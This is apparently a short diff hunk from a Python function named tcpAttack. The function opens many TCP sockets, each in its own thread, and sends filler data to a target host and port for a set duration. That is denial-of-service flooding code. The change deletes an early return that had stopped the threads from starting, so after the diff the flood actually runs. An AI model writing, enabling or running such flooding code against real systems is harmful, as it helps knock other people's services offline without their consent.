@@ -56,7 +56,7 @@ def tcpAttack(target,port,count,duration) :
     for _ in range(count) :
         socket = getTCPSocket()
         tcpThreads.append(Thread(target=send,args=(socket,target,port,duration,' '*100)))
-    return
+
     # Start Threads
     for thread in tcpThreads :
         thread.start()
